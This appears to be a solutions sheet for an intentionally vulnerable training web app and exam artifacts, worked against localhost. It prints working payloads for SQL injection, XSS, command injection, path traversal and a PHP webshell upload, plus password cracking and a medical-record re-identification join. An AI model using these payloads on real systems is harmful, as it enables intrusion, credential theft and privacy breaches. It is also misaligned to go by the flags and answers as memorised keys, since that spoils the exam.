---
tags: [css-exam, labs, solution, web]
---
# VulnCorp (app 1) — Solutions
> ↑ Lab Kit · method: Web Penetration Test Checklist

Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http://localhost:8000`.

## 1. SQL injection — auth bypass + UNION  (`login.php`, `index.php?q=`)
**Answer:** login is a string-concatenated query → bypass with a comment; search is injectable → UNION-dump every credential.
**Command:**
```
# auth bypass:
curl -s "$U/login.php" --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
# dump all users via UNION (3 columns to match the SELECT):
curl -sG "$U/index.php" --data-urlencode "q=zzz%' UNION SELECT username,password,role FROM users-- -"
```
**Result:** logs in as admin → `FLAG{sql1_auth_byp4ss_and_1dor}`; UNION lists `admin:S3ntinel!Admin`, `alice:password123`, …
**Reason:** `"...WHERE username='$u' AND password='$p'"` — `admin'-- -` closes the string and comments out the password check; the search column count (3) matches so the UNION rows render.

## 2. Reflected XSS  (`index.php?q=`)
**Answer:** `q` is echoed into the HTML unencoded.
**Command:** `$U/index.php?q="><script>alert(document.domain)</script>`
**Result:** the script tag lands in the page and executes. **Reason:** no `htmlspecialchars()` on output.

## 3. Stored XSS  (guestbook on `index.php`)
**Answer:** the comment body is stored and rendered raw.
**Command:** `curl -s "$U/index.php" --data-urlencode "author=x" --data-urlencode "body=<script>alert(1)</script>"` then reload.
**Result:** every visitor runs the script. **Reason:** `body` echoed without encoding (author IS encoded — note the difference).

## 4. IDOR  (`profile.php?id=`)
**Answer:** no ownership check — any `id` reveals that user's note + API key.
**Command:** `curl -s "$U/profile.php?id=1"`
**Result:** admin's record → `FLAG{sql1_auth_byp4ss_and_1dor}` + API key. **Reason:** object id trusted straight from the URL.

## 5. Command injection  (`tools.php?host=`)
**Answer:** `host` is concatenated into a shell `ping`.
**Command:** `curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1;id"`  (also `|id`, `$(id)`, `&&id`)
**Result:** `uid=... ` appears below the ping output. **Reason:** `shell_exec("ping -c 1 ".$host)` — no escaping.

## 6. LFI / path traversal  (`index.php?page=`)
**Answer:** `page` is included with no sanitisation.
**Command:**
```
curl -sG "$U/index.php" --data-urlencode "page=../private/flag.txt"
curl -sG "$U/index.php" --data-urlencode "page=../../../../../../../../etc/passwd"   # add enough ../ for your path
```
**Result:** `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}`, then `root:x:0:0:`. **Reason:** `include __DIR__."/pages/".$page`.

## 7. Insecure file upload  (`upload.php`)
**Answer:** no extension/type check → upload a PHP webshell under the web root and run it.
**Command:**
```
echo '<?php system($_GET["c"]); ?>' > sh.php
curl -s -F "file=@sh.php" "$U/upload.php"
curl -s "$U/uploads/sh.php?c=id"
```
**Result:** `uid=...` → RCE. **Reason:** `move_uploaded_file` with the raw client filename, no validation; `uploads/` is servable.

## 8. Weak CSP  (every page)
**Answer:** the CSP allows `script-src 'unsafe-inline'`, so injected inline scripts run (the XSS is *not* mitigated).
**Command:** `curl -sD - "$U/" -o /dev/null | grep -i content-security-policy`
**Result:** `...script-src 'self' 'unsafe-inline'...`. **Reason:** `'unsafe-inline'` defeats the main purpose of CSP — compare with challenges 5/6 where it was absent.

## 9. Information disclosure
**Answer:** a config backup, robots, a security.txt pointer, and an HTML comment leak secrets/paths.
**Command:**
```
curl -s "$U/config.php.bak"                     # ADMIN_PASS + API_SIGNING_KEY
curl -s "$U/robots.txt"; curl -s "$U/.well-known/security.txt"
curl -s "$U/private/deployment-notes.txt"       # pointed to by security.txt
curl -s "$U/" | grep -i '<!--'                  # dev TODO comment
```
**Result:** admin creds, signing key, internal deployment notes. **Reason:** backup/`.well-known`/comments left in the web root.

## 10. Weak / default credentials  (`login.php`)
**Answer:** several accounts use guessable passwords.
**Command:** try `admin:S3ntinel!Admin`, `alice:password123`, `bob:letmein`, `svc_backup:Backup2024!` (or Hydra against the form).
**Reason:** weak password policy on service/user accounts.

---
## File artifacts (brief)
- **certs/bad-webmail.crt** → `openssl x509 -in bad-webmail.crt -noout -text`: self-signed (subject=issuer), **1024-bit**, **expired 2022→2023**, SAN has wildcard+IP = 3 flaws; a browser would reject it (untrusted + expired).
- **chain** → `openssl verify -CAfile root_ca.pem -untrusted intermediate_ca.pem server.pem` = OK; CRL: `openssl crl -in intermediate.crl -noout -text` (revoked list contains `revoked.pem`, not `server.pem`).
- **keys/encrypted_rsa** → crack passphrase: `ssh2john encrypted_rsa > h; john h --wordlist=rockyou.txt` → `Summer2024!`; derive pub: `ssh-keygen -y -f id_ed25519`.
- **email/phishing.eml** → `grep -aboF 'LS0tLS1CRUdJTiBPUEVOU1NI' phishing.eml` finds the key appended outside MIME; decode the trailing base64 → OpenSSH key. Headers: SPF=fail, dkim=none, Reply-To to a different domain.
- **network/*.pcap** → `tshark -r http_login_cleartext.pcap -z follow,tcp,ascii,0 -q` → `username=admin&password=S3ntinel!Admin`.
- **data/kpi_audit.db** → `sqlite3 kpi_audit.db "SELECT COUNT(DISTINCT user_id) FROM sessions WHERE substr(started_at,1,10)='2026-06-30'"` ≈ 130 vs claimed 24500 (overstated); exclude out-of-window July rows + decoy models/internal users.
- **data/medical_release.csv + voter_list.csv** → join on age+zip+gender: rows unique on those 3 quasi-identifiers (e.g. age 29/zip 8001/F appears >1 but 55/3011/M links to one name) → re-identify.
- **hashes/** → `hashid`/`hash-identifier`, then `john --wordlist=rockyou.txt`: md5→password, sha1→dragon, apr1→summer, sha512→hunter2.
